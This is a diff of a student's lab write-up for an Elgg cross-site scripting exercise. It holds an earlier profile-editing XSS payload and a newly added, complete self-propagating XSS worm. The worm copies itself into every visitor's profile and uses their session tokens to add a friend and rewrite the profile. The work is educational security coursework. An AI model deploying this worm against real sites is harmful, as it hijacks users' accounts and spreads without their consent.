@@ -83,11 +83,11 @@ In addition to adding himself as a friend, Samy can also use cross-site scriptin
         let guid = "&guid="+elgg.session.user.guid;
         let ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
         let token = "__elgg_token="+elgg.security.token.__elgg_token;
-        
+
         //Construct the content of your url.
         let sendurl = "http://www.xsslabelgg.com/action/profile/edit";
         let content = token + ts + "&description=Samy is my hero&accesslevel[description]=2" + guid;
-        
+
         let samyGuid = 47;
         if(elgg.session.user.guid != samyGuid) {
             //Create and send xhr request to modify profile
@@ -105,3 +105,48 @@ In addition to adding himself as a friend, Samy can also use cross-site scriptin
 ### Question 3
 
 We need this line in order to make the attack successful since the page redirects to the user's profile after saving their profile. If we remove this line (or set it to `if (true)`), once Samy saves the malicious script, it will immediately send the POST request to change his own profile to say "Samy is my hero" and therefore when future visitors arrive at his profile, that is all they will see. Therefore, we first need to check if the user viewing the page is Samy himself; if so, the attack should not happen.
+
+## Task 6: Writing a Self-Propagating XSS Worm
+
+One of the more widespread effects of XSS can be seen through the creation of self-propagating worms. By combining both scripts above, Samy can then create a self-propagating worm which will modify the visitor's profile and add the same script to their profile which will further spread to visitors of that profile.
+
+```html
+<script id="worm">
+
+    window.onload = function() {
+        let headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+        let jsCode = document.getElementById("worm").innerHTML;
+        let tailTag = "</" + "script>";
+        let wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+
+        let userName = elgg.session.user.name;
+        let guid = "&guid="+elgg.session.user.guid;
+        let ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
+        let token = "&__elgg_token="+elgg.security.token.__elgg_token;
+
+        //Construct the HTTP request to add Samy as a friend and modify their profile.
+        let addFriendURL = "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token;
+        let profileEditURL = "http://www.xsslabelgg.com/action/profile/edit";
+        let content = token + ts + "&description=Samy is my hero" + wormCode + "&accesslevel[description]=2" + guid;
+
+        let samyGuid = 47;
+        if(elgg.session.user.guid != samyGuid) {
+            //Create and send xhr request to add friend
+            let addFriend = null;
+            addFriend = new XMLHttpRequest();
+            addFriend.open("GET",addFriendURL,true);
+            addFriend.setRequestHeader("Host","www.xsslabelgg.com");
+            addFriend.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+            addFriend.send();
+
+            //Create and send xhr request to modify profile
+            let changeProfile = null;
+            changeProfile = new XMLHttpRequest();
+            changeProfile.open("POST",profileEditURL,true);
+            changeProfile.setRequestHeader("Host","www.xsslabelgg.com");
+            changeProfile.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            changeProfile.send(content);
+        }
+    }
+</script>
+```
